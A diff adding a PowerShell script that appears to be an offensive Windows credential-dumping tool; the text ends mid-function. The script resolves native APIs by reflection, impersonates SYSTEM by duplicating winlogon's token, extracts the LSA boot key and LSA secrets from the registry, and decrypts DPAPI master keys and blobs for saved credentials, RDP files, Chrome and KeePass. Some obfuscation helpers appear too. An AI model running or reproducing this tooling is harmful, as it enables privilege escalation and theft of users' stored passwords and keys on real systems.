@@ -1,0 +1,685 @@
+[System.Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null
+
+$v1 = @(
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Mandatory')),
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('string'))
+)
+
+$v2 = [System.Collections.Hashtable]::new()
+$v2.Add([char]69 + [char]110 + [char]99 + [char]114 + [char]121 + [char]112 + [char]116, [char]57 + [char]51)
+
+filter Invoke-ObfuscatedTransform {
+    param([byte[]]$Data, [bool]$Reverse = $false)
+    
+    $magicNumbers = @(13, 37, 42, 255, 128)
+    $result = New-Object byte[] $Data.Length
+    
+    for ($i = 0; $i -lt $Data.Length; $i++) {
+        if ($Reverse) {
+            $result[$i] = $Data[$i] -bxor $magicNumbers[$i % $magicNumbers.Length]
+        } else {
+            $result[$i] = $Data[$i] -bxor $magicNumbers[$i % $magicNumbers.Length]
+        }
+    }
+    return $result
+}
+
+function Invoke-FunctionLookupHelper {
+    param ([string] $modName, [string] $funcName)
+
+    $gacAsm = [AppDomain]::CurrentDomain.GetAssemblies() |
+        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }
+    
+    $helperType = $gacAsm.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $ptrMethod = $helperType.GetMethod('GetProcAddress', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static, $null, [Type[]] @([IntPtr], [string]),$null)
+
+    if ($ptrMethod) {
+        $modHandle = $helperType.GetMethod('GetModuleHandle').Invoke($null, @($modName))
+        return $ptrMethod.Invoke($null, @($modHandle, $funcName))
+    }
+
+    $handleRefMethod = $helperType.GetMethod('GetProcAddress', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static, $null,[Type[]] @([System.Runtime.InteropServices.HandleRef], [string]),$null)
+    if (-not $handleRefMethod) {
+        throw 'Could not find suitable method'
+    }
+
+    $modHandle = $helperType.GetMethod('GetModuleHandle').Invoke($null, @($modName))
+    $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $modHandle)
+    return $handleRefMethod.Invoke($null, @($handleRef, $funcName))
+}
+
+function Get-DelegateType {
+    param ([Type[]] $paramTypes, [Type] $returnType = [Void])
+
+    $asmName = New-Object System.Reflection.AssemblyName('DynamicDelegate')
+    $asmBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $modBuilder = $asmBuilder.DefineDynamicModule('DynamicModule', $false)
+
+    $typeBuilder = $modBuilder.DefineType(
+        'DynamicDelegateType',
+        [System.Reflection.TypeAttributes]::Class -bor
+        [System.Reflection.TypeAttributes]::Public -bor
+        [System.Reflection.TypeAttributes]::Sealed -bor
+        [System.Reflection.TypeAttributes]::AnsiClass -bor
+        [System.Reflection.TypeAttributes]::AutoClass,
+        [System.MulticastDelegate]
+    )
+
+    $ctor = $typeBuilder.DefineConstructor(
+        [System.Reflection.MethodAttributes]::RTSpecialName -bor
+        [System.Reflection.MethodAttributes]::HideBySig -bor
+        [System.Reflection.MethodAttributes]::Public,
+        [System.Reflection.CallingConventions]::Standard,
+        $paramTypes
+    )
+    $ctor.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor [System.Reflection.MethodImplAttributes]::Managed)
+
+    $invokeMethod = $typeBuilder.DefineMethod(
+        'Invoke',
+        [System.Reflection.MethodAttributes]::Public -bor
+        [System.Reflection.MethodAttributes]::HideBySig -bor
+        [System.Reflection.MethodAttributes]::NewSlot -bor
+        [System.Reflection.MethodAttributes]::Virtual,
+        $returnType,
+        $paramTypes
+    )
+    $invokeMethod.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor [System.Reflection.MethodImplAttributes]::Managed)
+
+    return $typeBuilder.CreateType()
+}
+
+$f1 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookupHelper -modName 'Kernel32.dll' -funcName 'OpenProcess'),(Get-DelegateType @([UInt32],[bool],[UInt32])([IntPtr])))
+$f2 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookupHelper -modName 'Advapi32.dll' -funcName 'OpenProcessToken'),(Get-DelegateType @([IntPtr],[UInt32],[IntPtr].MakeByRefType())([bool])))
+$f3 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookupHelper -modName 'Advapi32.dll' -funcName 'DuplicateTokenEx'),(Get-DelegateType @([IntPtr],[UInt32],[IntPtr],[UInt32],[UInt32],[IntPtr].MakeByRefType())([bool])))
+$f4 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookupHelper -modName 'Advapi32.dll' -funcName 'ImpersonateLoggedOnUser'),(Get-DelegateType @([IntPtr])([bool])))
+$f5 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookupHelper -modName 'Advapi32.dll' -funcName 'RegOpenKeyExA'),(Get-DelegateType @([Int32],[string],[Int32],[Int32],[IntPtr].MakeByRefType())([Int32])))
+$f6 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookupHelper -modName 'Advapi32.dll' -funcName 'RegQueryValueExA'),(Get-DelegateType @([IntPtr],[string],[IntPtr],[UInt32].MakeByRefType(),[IntPtr],[UInt32].MakeByRefType())([Int32])))
+$f7 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookupHelper -modName 'Advapi32.dll' -funcName 'RegQueryInfoKeyA'),(Get-DelegateType @([Int32],[System.Text.StringBuilder],[Int32].MakeByRefType(),[Int32],[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[IntPtr])([Int32])))
+$f8 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookupHelper -modName 'Advapi32.dll' -funcName 'RegCloseKey'),(Get-DelegateType @([Int32])([Int32])))
+$f9 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookupHelper -modName 'Advapi32.dll' -funcName 'RevertToSelf'),(Get-DelegateType -parameterTypes $null -returnType ([bool])))
+
+function Invoke-ElevatePrivs {
+    $currentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+    
+    if ($currentSid -eq 'S-1-5-18') { 
+        return $true 
+    }
+
+    $winlogonId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
+    
+    $procHandle = $f1.Invoke(0x400, $true, [int]$winlogonId)
+    
+    if ($procHandle -eq [IntPtr]::Zero) { 
+        return $false
+    }
+
+    $tokenHandle = [IntPtr]::Zero
+    
+    if (-not $f2.Invoke($procHandle, 0x0E, [ref]$tokenHandle)) { 
+        return $false
+    }
+
+    $dupHandle = [IntPtr]::Zero
+    
+    if (-not $f3.Invoke($tokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupHandle)) { 
+        return $false
+    }
+
+    try {
+        if (-not $f4.Invoke($dupHandle)) { 
+            return $false
+        }
+        
+        $newSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        return ($newSid -eq 'S-1-5-18')
+    }
+    catch {
+        return $false
+    }
+}
+
+if (-not [Type]::GetType('Pbkdf2', $false, $false)) {
+Add-Type -TypeDefinition @"
+using System;
+using System.Security.Cryptography;
+
+public class Pbkdf2 {
+    public Pbkdf2(HMAC algorithm, Byte[] password, Byte[] salt, Int32 iterations) {
+        if (algorithm == null) { throw new ArgumentNullException("algorithm", "Algorithm cannot be null."); }
+        if (salt == null) { throw new ArgumentNullException("salt", "Salt cannot be null."); }
+        if (password == null) { throw new ArgumentNullException("password", "Password cannot be null."); }
+        this.Algorithm = algorithm;
+        this.Algorithm.Key = password;
+        this.Salt = salt;
+        this.IterationCount = iterations;
+        this.BlockSize = this.Algorithm.HashSize / 8;
+        this.BufferBytes = new byte[this.BlockSize];
+    }
+    
+    private readonly int BlockSize;
+    private uint BlockIndex = 1;
+    private byte[] BufferBytes;
+    private int BufferStartIndex = 0;
+    private int BufferEndIndex = 0;
+    
+    public HMAC Algorithm { get; private set; }
+    public Byte[] Salt { get; private set; }
+    public Int32 IterationCount { get; private set; }
+    
+    public Byte[] GetBytes(int count, string algorithm = "sha512") {
+        byte[] result = new byte[count];
+        int resultOffset = 0;
+        int bufferCount = this.BufferEndIndex - this.BufferStartIndex;
+
+        if (bufferCount > 0) {
+            if (count < bufferCount) {
+                Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, count);
+                this.BufferStartIndex += count;
+                return result;
+            }
+            Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, bufferCount);
+            this.BufferStartIndex = this.BufferEndIndex = 0;
+            resultOffset += bufferCount;
+        }
+        
+        while (resultOffset < count) {
+            int needCount = count - resultOffset;
+            if (algorithm.ToLower() == "sha256")
+                this.BufferBytes = this.Func(false);
+            else
+                this.BufferBytes = this.Func();
+                
+            if (needCount > this.BlockSize) {
+                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, this.BlockSize);
+                resultOffset += this.BlockSize;
+            } else {
+                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, needCount);
+                this.BufferStartIndex = needCount;
+                this.BufferEndIndex = this.BlockSize;
+                return result;
+            }
+        }
+        return result;
+    }
+    
+    private byte[] Func(bool mscrypto = true) {
+        var hash1Input = new byte[this.Salt.Length + 4];
+        Buffer.BlockCopy(this.Salt, 0, hash1Input, 0, this.Salt.Length);
+        Buffer.BlockCopy(GetBytesFromInt(this.BlockIndex), 0, hash1Input, this.Salt.Length, 4);
+        var hash1 = this.Algorithm.ComputeHash(hash1Input);
+        byte[] finalHash = hash1;
+        
+        for (int i = 2; i <= this.IterationCount; i++) {
+            hash1 = this.Algorithm.ComputeHash(hash1, 0, hash1.Length);
+            for (int j = 0; j < this.BlockSize; j++) {
+                finalHash[j] = (byte)(finalHash[j] ^ hash1[j]);
+            }
+            if (mscrypto)
+                Array.Copy(finalHash, hash1, hash1.Length);
+        }
+        
+        if (this.BlockIndex == uint.MaxValue) { 
+            throw new InvalidOperationException("Derived key too long."); 
+        }
+        this.BlockIndex += 1;
+        return finalHash;
+    }
+    
+    private static byte[] GetBytesFromInt(uint i) {
+        var bytes = BitConverter.GetBytes(i);
+        if (BitConverter.IsLittleEndian) {
+            return new byte[] { bytes[3], bytes[2], bytes[1], bytes[0] };
+        } else {
+            return bytes;
+        }
+    }
+}
+"@ -ReferencedAssemblies System.Security
+}
+
+function Get-SystemBootKey {
+    $ScrambledKey = [System.Text.StringBuilder]::new()
+    $keyNames = @("JD", "Skew1", "GBG", "Data")
+
+    foreach ($Key in $keyNames) {
+        [string] $KeyPath = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\$Key"
+        $ClassVal = [System.Text.StringBuilder]::new(1024)
+        $Len = 1024
+        $hKey = [IntPtr]::Zero
+        $dummy = [IntPtr]::Zero
+
+        $Result = $f5.Invoke(0x80000002, $KeyPath, 0x0, 0x19, [ref]$hKey)
+        
+        if ($Result -ne 0) {
+            $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
+            Write-Host "[!] Error opening $KeyPath : $ErrCode"
+            return $null
+        }
+
+        $Result = $f7.Invoke($hKey, $ClassVal, [ref]$Len, 0x0, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [IntPtr]::Zero)
+        
+        if ($Result -ne 0) {
+            $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
+            Write-Host "[!] Error querying $KeyPath : $ErrCode"
+            return $null
+        }
+
+        $f8.Invoke($hKey) > $null
+        $ScrambledKey.Append($ClassVal) > $null
+    }
+
+    $Descramble = @(0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7)
+    $BootKey = foreach ($i in $Descramble) { [Convert]::ToByte("$($ScrambledKey[$i * 2])$($ScrambledKey[$i * 2 + 1])", 16) }
+    $HexString = ($BootKey | ForEach-Object { $_.ToString("X2") }) -join ""
+
+    return $BootKey
+}
+
+function Get-LsaHash {
+    param ([byte[]] $Key, [byte[]] $RawData)
+
+    $bufferSize = $Key.Length + ($RawData.Length * 1000)
+    $buffer = New-Object byte[] $bufferSize
+    [System.Array]::Copy($Key, 0, $buffer, 0, $Key.Length)
+
+    for ($i = 0; $i -lt 1000; $i++) {
+        $dest = $Key.Length + ($i * $RawData.Length)
+        [System.Array]::Copy($RawData, 0, $buffer, $dest, $RawData.Length)
+    }
+
+    $sha256 = [System.Security.Cryptography.SHA256]::Create()
+    
+    try { 
+        return $sha256.ComputeHash($buffer) 
+    }
+    finally { 
+        $sha256.Dispose()
+    }
+}
+
+function Invoke-AesDecrypt {
+    param ([byte[]] $Key,[byte[]] $Data)
+
+    $aes = [System.Security.Cryptography.AesManaged]::new()
+    try {
+        $aes.Key = $Key
+        $aes.IV = New-Object byte[] 16
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.BlockSize = 128
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+
+        $transform = $aes.CreateDecryptor()
+        $chunks = [int][math]::Ceiling($Data.Length / 16)
+        $plaintext = New-Object byte[] ($chunks * 16)
+
+        for ($i = 0; $i -lt $chunks; $i++) {
+            $offset = $i * 16
+            $chunk = New-Object byte[] 16
+            [System.Array]::Copy($Data, $offset, $chunk, 0, 16)
+            $decryptedChunk = $transform.TransformFinalBlock($chunk, 0, 16)
+            [System.Array]::Copy($decryptedChunk, 0, $plaintext, $offset, 16)
+        }
+
+        return $plaintext
+    }
+    finally {
+        $transform.Dispose()
+        $aes.Dispose()
+    }
+}
+
+function Get-LsaKey {
+    $BootKey = Get-SystemBootKey
+    $LSAKeyEncryptedStruct = Get-ItemPropertyValue -Path "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)"
+    $LSAEncryptedData = $LSAKeyEncryptedStruct[28..($LSAKeyEncryptedStruct.Length - 1)]
+    $LSAEncryptedDataEncryptedKey = $LSAEncryptedData[0..31]
+    $tmpKey = Get-LsaHash -Key $BootKey -RawData $LSAEncryptedDataEncryptedKey
+    $LSAEncryptedDataRemainder = $LSAEncryptedData[32..($LSAEncryptedData.Length - 1)]
+    $LSAKeyStructPlaintext = Invoke-AesDecrypt -Key $tmpKey -Data $LSAEncryptedDataRemainder
+    $LSAKey = New-Object byte[] 32
+    [System.Array]::Copy($LSAKeyStructPlaintext, 68, $LSAKey, 0, 32)
+
+    function ToHex($bytes) { ($bytes | ForEach-Object { $_.ToString("X2") }) -join '' }
+    Write-Host "[*] BootKey : $(ToHex $BootKey)"
+    Write-Host "[*] tmpKey  : $(ToHex $tmpKey)"
+    Write-Host "[*] LSA Key : $(ToHex $LSAKey)"
+
+    return $LSAKey
+}
+
+function Get-LsaSecretData {
+    param ([string] $SecretName)
+
+    $LSAKey = Get-LsaKey
+    $RegistryPath = "HKLM:\SECURITY\Policy\Secrets\$SecretName\CurrVal"
+
+    try {
+        $RegistryKey = Get-Item -Path $RegistryPath -ErrorAction Stop
+        $KeyData = $RegistryKey.GetValue("")
+
+        if (-not $KeyData -or $KeyData.Length -lt 28) {
+            Write-Warning "Invalid registry data for $SecretName"
+            return $null
+        }
+
+        $keyEncryptedData = $keyData[28..($keyData.Length-1)]
+        $keyEncryptedDataEncryptedKey = $keyEncryptedData[0..31]
+        $tmpKey = Get-LsaHash -Key $LSAKey -RawData $keyEncryptedDataEncryptedKey
+        $keyEncryptedDataRemainder = $keyEncryptedData[32..($keyEncryptedData.Length-1)]
+        $keyPathPlaintext = Invoke-AesDecrypt -Key $tmpKey -Data $keyEncryptedDataRemainder
+
+        if ($SecretName -eq "DPAPI_SYSTEM") {
+            return $keyPathPlaintext[20..59]
+        }
+
+        Write-Warning "LSA Secret '$SecretName' not implemented"
+        return $null
+    }
+    catch {
+        Write-Warning "Error accessing registry: $_"
+        return $null
+    }
+}
+
+function Get-DpapiKeys {
+    $dpapiKeyFull = Get-LsaSecretData -SecretName "DPAPI_SYSTEM"
+    $script:dpapiMachineKeysBytes = New-Object byte[] 20
+    $script:dpapiUserKeysBytes = New-Object byte[] 20
+
+    [System.Array]::Copy($dpapiKeyFull, 0, $script:dpapiMachineKeysBytes, 0, 20)
+    [System.Array]::Copy($dpapiKeyFull, 20, $script:dpapiUserKeysBytes, 0, 20)
+
+    function ToHex($bytes) { ($bytes | ForEach-Object { $_.ToString("X2") }) -join '' }
+
+    Write-Host ""
+    Write-Host "[*] Secret  : DPAPI_SYSTEM"
+    Write-Host "[*] Full    : $(( $dpapiKeyFull | ForEach-Object { $_.ToString('X2') } ) -join '')"
+    Write-Host "[*] Machine : $(( $script:dpapiMachineKeysBytes | ForEach-Object { $_.ToString('X2') } ) -join '')"
+    Write-Host "[*] User    : $(( $script:dpapiUserKeysBytes | ForEach-Object { $_.ToString('X2') } ) -join '')"
+    Write-Host ""
+}
+
+function Get-MasterKeyData {
+    param ([byte[]] $masterKeyBytes)
+
+    $offset = 96
+    $masterKeyLength = [System.BitConverter]::ToInt64($masterKeyBytes, $offset)
+    $offset += 4 * 8
+
+    if ($masterKeyLength -lt 0 -or $masterKeyLength -gt 1048576) {
+        return "[!] MasterKeyLength value $masterKeyLength is invalid"
+    }
+
+    $masterKeySubBytes = New-Object byte[] ([int]$masterKeyLength)
+    [System.Array]::Copy($masterKeyBytes, $offset, $masterKeySubBytes, 0, [int]$masterKeyLength)
+    return $masterKeySubBytes
+}
+
+function Derive-KeyMaterial {
+    param ([byte[]] $shaBytes, [uint32] $algHash, [byte[]] $salt, [int] $rounds)
+
+    switch ($algHash) {
+        32782 {
+            $hmac = [System.Security.Cryptography.HMACSHA512]::new()
+            $df = [Pbkdf2]::new($hmac, $shaBytes, $salt, $rounds)
+            $derivedPreKey = $df.GetBytes(48, "sha512")
+            break
+        }
+        32777 {
+            $hmac = [System.Security.Cryptography.HMACSHA1]::new()
+            $df = [Pbkdf2]::new($hmac, $shaBytes, $salt, $rounds)
+            $derivedPreKey = $df.GetBytes(32, "sha1")
+            break
+        }
+        default {
+            throw "Unsupported algHash: $algHash"
+        }
+    }
+
+    return $derivedPreKey
+}
+
+function Decrypt-AesData {
+    param ([byte[]] $ShaBytes, [byte[]] $Final, [byte[]] $EncData)
+
+    $HMACLen = [System.Security.Cryptography.HMACSHA512]::new().HashSize / 8
+    $IVBytes = New-Object byte[] 16
+    $key = New-Object byte[] 32
+    [Array]::Copy($Final, 32, $IVBytes, 0, 16)
+    [Array]::Copy($Final, 0, $key, 0, 32)
+
+    $aes = New-Object Security.Cryptography.AesManaged
+    $aes.Key = $key
+    $aes.IV = $IVBytes
+    $aes.Mode = [Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [Security.Cryptography.PaddingMode]::Zeros
+    $dec = $aes.CreateDecryptor()
+    $plain = $dec.TransformFinalBlock($EncData, 0, $EncData.Length)
+
+    $outLen = $plain.Length
+    $outputLen = $outLen - 16 - $HMACLen
+    $mkFull = New-Object byte[] $HMACLen
+    [Array]::Copy($plain, $outLen - $outputLen, $mkFull, 0, $mkFull.Length)
+    $sha1 = [System.Security.Cryptography.SHA1Managed]::Create()
+    $mkSha1 = $sha1.ComputeHash($mkFull)
+
+    $cryptBuf = New-Object byte[] 16
+    [Array]::Copy($plain, $cryptBuf, 16)
+    $hmac1 = [System.Security.Cryptography.HMACSHA512]::new($ShaBytes)
+    $r1Hmac = $hmac1.ComputeHash($cryptBuf)
+
+    $r2Buf = New-Object byte[] $outputLen
+    [Array]::Copy($plain, $outLen - $outputLen, $r2Buf, 0, $outputLen)
+    $hmac2 = [System.Security.Cryptography.HMACSHA512]::new($r1Hmac)
+    $r2Hmac = $hmac2.ComputeHash($r2Buf)
+
+    $cmp = New-Object byte[] 64
+    [Array]::Copy($plain, 16, $cmp, 0, $cmp.Length)
+
+    if (-not [System.Linq.Enumerable]::SequenceEqual($cmp, $r2Hmac)) {
+        throw "HMAC integrity check failed!"
+    }
+
+    return $mkSha1
+}
+
+function Decrypt-3DESData {
+    param ([byte[]] $Final, [byte[]] $EncData)
+
+    $ivBytes = New-Object byte[] 8
+    $key = New-Object byte[] 24
+    [Array]::Copy($Final, 24, $ivBytes, 0, 8)
+    [Array]::Copy($Final, 0, $key, 0, 24)
+
+    $des = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
+    $des.Key = $key
+    $des.IV = $ivBytes
+    $des.Mode = [Security.Cryptography.CipherMode]::CBC
+    $des.Padding = [Security.Cryptography.PaddingMode]::Zeros
+
+    $decryptor = $des.CreateDecryptor()
+    $plaintextBytes = $decryptor.TransformFinalBlock($EncData, 0, $EncData.Length)
+
+    $decryptedKey = New-Object byte[] 64
+    [Array]::Copy($plaintextBytes, 40, $decryptedKey, 0, 64)
+
+    $sha1 = New-Object Security.Cryptography.SHA1Managed
+    $masterKeySha1 = $sha1.ComputeHash($decryptedKey)
+
+    return $masterKeySha1
+}
+
+function Decrypt-MasterKey {
+    param ([byte[]] $MasterKeyBytes,[byte[]] $SHABytes)
+
+    $guid = '{' + [System.Text.Encoding]::Unicode.GetString($MasterKeyBytes, 12, 72) + '}'
+    $mkBytes = Get-MasterKeyData $MasterKeyBytes
+
+    $offset = 4
+    $salt = New-Object byte[] 16
+    [Array]::Copy($mkBytes, $offset, $salt, 0, 16)
+    $offset += 16
+
+    $rounds = [BitConverter]::ToInt32($mkBytes, $offset)
+    $offset += 4
+
+    $algHash = [BitConverter]::ToUInt32($mkBytes, $offset)
+    $offset += 4
+
+    $algCrypt = [BitConverter]::ToUInt32($mkBytes, $offset)
+    $offset += 4
+
+    $encData = New-Object byte[] ($mkBytes.Length - $offset)
+    [Array]::Copy($mkBytes, $offset, $encData, 0, $encData.Length)
+
+    $derivedPreKey = Derive-KeyMaterial -shaBytes $SHABytes -algHash $algHash -salt $salt -rounds $rounds
+
+    if ($algCrypt -eq 26128 -and $algHash -eq 32782) {
+        $masterKeySha1 = Decrypt-AesData -ShaBytes $shaBytes -Final $derivedPreKey -EncData $encData
+        $masterKeyStr = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
+        return @{ $guid = $masterKeyStr }
+    }
+    elseif ($algCrypt -eq 26115 -and ($algHash -eq 32777 -or $algHash -eq 32772)) {
+        $masterKeySha1 = Decrypt-3DESData -Final $derivedPreKey -EncData $encData
+        $masterKeyStr = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
+        return @{ $guid = $masterKeyStr }
+    }
+    else {
+        throw "Alg crypt '$algCrypt / 0x{0:X8}' not currently supported!" -f $algCrypt
+    }
+}
+
+function Process-DpapiBlob {
+    param ([byte[]]$blobBytes, [hashtable] $MasterKeys,[string] $blobType = "blob",[bool] $unprotect = $false, [byte[]] $entropy = $null)
+
+    $offset = 0
+    
+    if ($blobType -eq "credential") { 
+        $offset = 36
+    }
+    elseif ($blobType -in @("policy","blob","rdg","chrome","keepass")) { 
+        $offset = 24
+    }
+    else {
+        Write-Host "[!] Unsupported blob type: $blobType"
+        return ,@()
+    }
+
+    $guidMasterKey = [Guid]::new([byte[]]$blobBytes[$offset..($offset+15)])
+    $guidString = "{$guidMasterKey}"
+    $offset += 16
+
+    if ($blobType -notin "rdg","chrome") {
+        Write-Host "    guidMasterKey    : $guidString"
+        Write-Host "    size             : $($blobBytes.Length)"
+    }
+
+    $flags = [BitConverter]::ToUInt32($blobBytes, $offset)
+    $offset += 4
+    
+    if ($blobType -notin "rdg","chrome") {
+        $flagInfo = "0x$($flags.ToString('X8'))"
+        
+        if ($flags -eq 0x20000000) { 
+            $flagInfo += " (CRYPTPROTECT_SYSTEM)"
+        }
+        
+        Write-Host "    flags            : $flagInfo"
+    }
+
+    $descLength = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset += 4
+    $description = [System.Text.Encoding]::Unicode.GetString($blobBytes, $offset, $descLength)
+    $offset += $descLength
+
+    $algCrypt = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset += 4
+    $algCryptLen = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset += 4
+    $saltLen = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset += 4
+    $saltBytes = $blobBytes[$offset..($offset+$saltLen-1)]
+    $offset += $saltLen
+
+    $hmacKeyLen = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset += 4 + $hmacKeyLen
+    $algHash = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset += 4
+
+    if ($blobType -notin "rdg","chrome") {
+        Write-Host "    algHash/algCrypt : $algHash ($([CryptAlg]$algHash)) / $algCrypt ($([CryptAlg]$algCrypt))"
+        Write-Host "    description      : $description"
+    }
+
+    $algHashLen = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset += 4
+    $hmac2KeyLen = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset += 4 + $hmac2KeyLen
+
+    $dataLen = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset += 4
+    $dataBytes = $blobBytes[$offset..($offset+$dataLen-1)]
+
+    if ($unprotect -and $blobType -in "blob","rdg","chrome","keepass") {
+        try {
+            return [System.Security.Cryptography.ProtectedData]::Unprotect($blobBytes,$entropy,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        }
+        catch {
+            return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
+        }
+    }
+
+    if ($MasterKeys.ContainsKey($guidString)) {
+        $keyBytes = [System.Collections.Generic.List[byte]]::new()
+        
+        for ($i = 0; $i -lt $MasterKeys[$guidString].Length; $i += 2) {
+            $keyBytes.Add([Convert]::ToByte($MasterKeys[$guidString].Substring($i, 2), 16))
+        }
+        
+        $keyBytes = $keyBytes.ToArray()
+
+        try {
+            $hmac = $null
+            
+            if($algHash -eq 32772) { 
+                $hmac = [System.Security.Cryptography.HMACSHA1]::new($keyBytes)
+            }
+            elseif ($algHash -eq 32782) { 
+                $hmac = [System.Security.Cryptography.HMACSHA512]::new($keyBytes)
+            }
+            else {
+                Write-Host "    [!] Unsupported hash algorithm: $algHash"
+                return ,@()
+            }
+
+            $inputBytes = $saltBytes
+            
+            if ($entropy) { 
+                $inputBytes += $entropy
+            }
+            
+            $derivedKeyBytes = $hmac.ComputeHash($inputBytes)
+            $hmac.Dispose()
+
+            $keySize = $algCryptLen / 8
+            $finalKeyBytes = $derivedKeyBytes[0..($keySize-1)]
+
+            $padding = if ($blobType -eq "credential") { "PKCS7" } else { "None" }
+            $decrypted = Decrypt-BlobData -ciphertext $dataBytes -key $finalKeyBytes -algId $algCrypt
+
+            return $decrypted
+        }
+        catch {
+            Write-Host "    [X] Error during decryption: $_"
+        }
+    }
+    else {
+        if ($blobType -in "rdg","chrome") {
+            return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
+        }
+        else {
+            Write-Host "    [!] MasterKey GUID not in cache: $guidString"
+        }
+    }
+
+    return ,
